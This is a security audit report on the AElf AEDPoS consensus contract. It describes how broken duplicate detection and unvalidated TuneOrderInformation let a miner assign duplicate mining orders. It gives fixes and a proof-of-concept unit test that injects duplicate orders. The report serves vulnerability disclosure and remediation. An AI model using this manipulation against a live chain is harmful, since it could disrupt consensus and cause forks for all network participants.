# Audit Report

## Title
Ineffective Duplicate Detection Allows Mining Order Manipulation via Unchecked TuneOrderInformation

## Summary
The `NextRoundMiningOrderValidationProvider` fails to detect duplicate `FinalOrderOfNextRound` values because it incorrectly applies `Distinct()` on entire `MinerInRound` objects rather than on the order values themselves. Combined with the absence of validation on `TuneOrderInformation` in `UpdateValue`, any active miner can inject duplicate mining orders, breaking consensus round generation and causing multiple miners to be assigned identical mining slots.

## Finding Description

The vulnerability stems from two interconnected flaws in the AEDPoS consensus validation logic:

**Flaw 1: Ineffective Duplicate Detection**

The `NextRoundMiningOrderValidationProvider` attempts to verify that miners who produced blocks have distinct next-round orders: [1](#0-0) 

However, calling `Distinct()` on a collection of `MinerInRound` objects only filters out completely identical objects across all fields. Since `MinerInRound` is a protobuf-generated message with value-based equality [2](#0-1)  and each miner has a unique `pubkey` field [3](#0-2) , no two `MinerInRound` objects will ever be considered duplicates regardless of whether they share the same `FinalOrderOfNextRound` value.

**Flaw 2: Unchecked TuneOrderInformation Application**

When miners call `UpdateValue`, they can provide arbitrary values in the `TuneOrderInformation` field: [4](#0-3) 

The `UpdateValueValidationProvider` only validates `OutValue`, `Signature`, and `PreviousInValue`, but performs no checks on `TuneOrderInformation`: [5](#0-4) 

These values are then applied directly to state without any conflict resolution: [6](#0-5) 

**Attack Execution**

A malicious miner can exploit this by:
1. Waiting for other miners to call `UpdateValue` and establish their `FinalOrderOfNextRound` values
2. Calling `UpdateValue` with a crafted `TuneOrderInformation` dictionary that assigns duplicate `FinalOrderOfNextRound` values to multiple miners (e.g., setting both MinerA and MinerB to order 3)
3. The faulty validation passes because it only checks object distinctness, not order value distinctness
4. When `GenerateNextRoundInformation` executes, multiple miners receive the same order assignment: [7](#0-6) 

The duplicate orders also corrupt the `occupiedOrders` calculation and `ableOrders` assignment for miners who missed their slots: [8](#0-7) 

While normal consensus data application includes conflict resolution logic [9](#0-8) , this protection is completely bypassed when miners provide `TuneOrderInformation` directly.

## Impact Explanation

This vulnerability directly violates the fundamental AEDPoS consensus invariant that each miner must have a unique mining order within a round. The consequences are severe:

1. **Consensus Integrity Breach**: Multiple miners assigned to the same order position creates an undefined state where the protocol cannot determine which miner should produce the next block.

2. **Chain Fork Risk**: If both miners with duplicate orders attempt to mine simultaneously, competing valid blocks may be produced at the same height, potentially causing chain reorganization or forks.

3. **Consensus DoS**: The invalid round state prevents normal block production progression. Functions like `BreakContinuousMining` that assume unique orders [10](#0-9)  will behave unpredictably with duplicate orders.

4. **Miner Scheduling Corruption**: The `ableOrders` calculation becomes incorrect when `occupiedOrders` contains duplicates, causing miners who legitimately missed their slots to be assigned wrong orders or preventing proper schedule generation entirely.

This affects all network participants by disrupting the deterministic block production schedule that AEDPoS consensus relies upon.

## Likelihood Explanation

**Attacker Profile**: Any miner participating in the current consensus round can execute this attack. The only permission requirement is being in the current or previous round's miner list: [11](#0-10) 

**Attack Complexity**: Low. The attacker needs to:
1. Call the publicly accessible `UpdateValue` method [12](#0-11) 
2. Provide a valid `UpdateValueInput` with malicious `TuneOrderInformation` mapping multiple miner pubkeys to the same order value
3. No additional exploitation steps required - the validation will pass and the malicious state will persist

**Feasibility**: Highly feasible. Active miners regularly call `UpdateValue` as part of normal consensus operations, so providing crafted input is trivial. The validation logic at both `UpdateValue` (via `UpdateValueValidationProvider`) and `NextRound` (via `NextRoundMiningOrderValidationProvider`) will incorrectly pass the malicious input.

**Detection**: The attack leaves observable evidence in the contract state (duplicate `FinalOrderOfNextRound` values) and will cause immediate failures when the next round generation attempts to use the corrupted schedule.

## Recommendation

**Fix 1: Correct the Duplicate Detection Logic**

Modify `NextRoundMiningOrderValidationProvider` to check for distinct order values, not distinct objects:

```csharp
var distinctCount = providedRound.RealTimeMinersInformation.Values
    .Where(m => m.FinalOrderOfNextRound > 0)
    .Select(m => m.FinalOrderOfNextRound)  // Extract order values first
    .Distinct().Count();
```

**Fix 2: Validate TuneOrderInformation**

Add validation in `UpdateValueValidationProvider` or `ProcessUpdateValue` to ensure:
- No duplicate values exist in `TuneOrderInformation`
- All assigned orders are within valid range [1, minersCount]
- Applied orders don't conflict with existing `FinalOrderOfNextRound` values

**Fix 3: Apply Conflict Resolution**

Extend the conflict resolution logic from `ApplyNormalConsensusData` to also apply when processing `TuneOrderInformation`:

```csharp
foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
{
    var supposedOrder = tuneOrder.Value;
    var conflicts = currentRound.RealTimeMinersInformation.Values
        .Where(i => i.Pubkey != tuneOrder.Key && i.FinalOrderOfNextRound == supposedOrder).ToList();
    
    foreach (var conflicted in conflicts)
    {
        // Reassign conflicted miner to next available order
        for (var i = supposedOrder + 1; i < minersCount * 2; i++)
        {
            var maybeNewOrder = i > minersCount ? i % minersCount : i;
            if (currentRound.RealTimeMinersInformation.Values.All(m => m.FinalOrderOfNextRound != maybeNewOrder))
            {
                currentRound.RealTimeMinersInformation[conflicted.Pubkey].FinalOrderOfNextRound = maybeNewOrder;
                break;
            }
        }
    }
    
    currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task DuplicateMiningOrderVulnerability_Test()
{
    // Setup: Initialize consensus with multiple miners
    await InitializeCandidates(5);
    var firstRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // Simulate normal mining by first 3 miners
    var minersToUpdate = firstRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order).Take(3).ToList();
    
    foreach (var miner in minersToUpdate)
    {
        var keyPair = InitialCoreDataCenterKeyPairs.First(k => k.PublicKey.ToHex() == miner.Pubkey);
        KeyPairProvider.SetKeyPair(keyPair);
        BlockTimeProvider.SetBlockTime(miner.ExpectedMiningTime);
        
        var tester = GetAEDPoSContractStub(keyPair);
        var trigger = new AElfConsensusTriggerInformation { Pubkey = ByteString.CopyFrom(keyPair.PublicKey) };
        var headerInfo = (await tester.GetConsensusExtraData.CallAsync(trigger.ToBytesValue())).ToConsensusHeaderInformation();
        var toUpdate = headerInfo.Round.ExtractInformationToUpdateConsensus(miner.Pubkey, ByteString.Empty);
        await tester.UpdateValue.SendAsync(toUpdate);
    }
    
    // Malicious miner crafts UpdateValueInput with duplicate orders
    var maliciousMiner = minersToUpdate[2]; // Last miner to update
    var maliciousKeyPair = InitialCoreDataCenterKeyPairs.First(k => k.PublicKey.ToHex() == maliciousMiner.Pubkey);
    KeyPairProvider.SetKeyPair(maliciousKeyPair);
    
    var currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var victim1 = minersToUpdate[0].Pubkey;
    var victim2 = minersToUpdate[1].Pubkey;
    
    // Create malicious TuneOrderInformation assigning duplicate order 3 to two miners
    var maliciousUpdate = new UpdateValueInput
    {
        OutValue = HashHelper.ComputeFrom("test"),
        Signature = HashHelper.ComputeFrom("sig"),
        RoundId = currentRound.RoundNumber,
        SupposedOrderOfNextRound = 5,
        TuneOrderInformation = { { victim1, 3 }, { victim2, 3 } } // DUPLICATE ORDER!
    };
    
    var maliciousTester = GetAEDPoSContractStub(maliciousKeyPair);
    
    // Attack: UpdateValue succeeds despite duplicate orders
    var result = await maliciousTester.UpdateValue.SendAsync(maliciousUpdate);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // PASSES!
    
    // Verify: Check that duplicate orders exist in state
    var corruptedRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var order1 = corruptedRound.RealTimeMinersInformation[victim1].FinalOrderOfNextRound;
    var order2 = corruptedRound.RealTimeMinersInformation[victim2].FinalOrderOfNextRound;
    
    // Both miners have the same FinalOrderOfNextRound!
    order1.ShouldBe(3);
    order2.ShouldBe(3); // VULNERABILITY CONFIRMED
    
    // When NextRound is called, both miners will be assigned order 3
    // causing consensus breakdown
}
```

## Notes

The vulnerability exists because protobuf-generated classes in C# use value-based equality that compares all fields. The `Distinct()` LINQ method relies on the object's `Equals()` implementation, which for `MinerInRound` means comparing all 17 fields including the unique `pubkey`. This makes the duplicate detection completely ineffective.

The issue is particularly severe because `TuneOrderInformation` was designed to allow miners to collaboratively adjust next-round orders, but without proper validation, it becomes a vector for consensus manipulation. The normal conflict resolution in `ApplyNormalConsensusData` doesn't apply here because that method is only called during consensus data application, not when processing `TuneOrderInformation` from external input.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/NextRoundMiningOrderValidationProvider.cs (L15-16)
```csharp
        var distinctCount = providedRound.RealTimeMinersInformation.Values.Where(m => m.FinalOrderOfNextRound > 0)
            .Distinct().Count();
```

**File:** protobuf/aedpos_contract.proto (L207-208)
```text
    // The tuning order of mining for the next round, miner public key -> order.
    map<string, int32> tune_order_information = 7;
```

**File:** protobuf/aedpos_contract.proto (L266-301)
```text
message MinerInRound {
    // The order of the miner producing block.
    int32 order = 1;
    // Is extra block producer in the current round.
    bool is_extra_block_producer = 2;
    // Generated by secret sharing and used for validation between miner.
    aelf.Hash in_value = 3;
    // Calculated from current in value.
    aelf.Hash out_value = 4;
    // Calculated from current in value and signatures of previous round.
    aelf.Hash signature = 5;
    // The expected mining time.
    google.protobuf.Timestamp expected_mining_time = 6;
    // The amount of produced blocks.
    int64 produced_blocks = 7;
    // The amount of missed time slots.
    int64 missed_time_slots = 8;
    // The public key of this miner.
    string pubkey = 9;
    // The InValue of the previous round.
    aelf.Hash previous_in_value = 10;
    // The supposed order of mining for the next round.
    int32 supposed_order_of_next_round = 11;
    // The final order of mining for the next round.
    int32 final_order_of_next_round = 12;
    // The actual mining time, miners must fill actual mining time when they do the mining.
    repeated google.protobuf.Timestamp actual_mining_times = 13;
    // The encrypted pieces of InValue.
    map<string, bytes> encrypted_pieces = 14;
    // The decrypted pieces of InValue.
    map<string, bytes> decrypted_pieces = 15;
    // The amount of produced tiny blocks.
    int64 produced_tiny_blocks = 16;
    // The irreversible block height that current miner recorded.
    int64 implied_irreversible_block_height = 17;
}
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L10-20)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Only one Out Value should be filled.
        if (!NewConsensusInformationFilled(validationContext))
            return new ValidationResult { Message = "Incorrect new Out Value." };

        if (!ValidatePreviousInValue(validationContext))
            return new ValidationResult { Message = "Incorrect previous in value." };

        return new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L259-260)
```csharp
        foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
            currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L326-328)
```csharp
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-32)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L40-41)
```csharp
        var occupiedOrders = minersMinedCurrentRound.Select(m => m.FinalOrderOfNextRound).ToList();
        var ableOrders = Enumerable.Range(1, minersCount).Where(i => !occupiedOrders.Contains(i)).ToList();
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L79-79)
```csharp
        var firstMinerOfNextRound = nextRound.RealTimeMinersInformation.Values.First(i => i.Order == 1);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ApplyNormalConsensusData.cs (L23-40)
```csharp
        // Check the existence of conflicts about OrderOfNextRound.
        // If so, modify others'.
        var conflicts = RealTimeMinersInformation.Values
            .Where(i => i.FinalOrderOfNextRound == supposedOrderOfNextRound).ToList();

        foreach (var orderConflictedMiner in conflicts)
            // Multiple conflicts is unlikely.

            for (var i = supposedOrderOfNextRound + 1; i < minersCount * 2; i++)
            {
                var maybeNewOrder = i > minersCount ? i % minersCount : i;
                if (RealTimeMinersInformation.Values.All(m => m.FinalOrderOfNextRound != maybeNewOrder))
                {
                    RealTimeMinersInformation[orderConflictedMiner.Pubkey].FinalOrderOfNextRound =
                        maybeNewOrder;
                    break;
                }
            }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L98-102)
```csharp
    public override Empty UpdateValue(UpdateValueInput input)
    {
        ProcessConsensusInformation(input);
        return new Empty();
    }
```
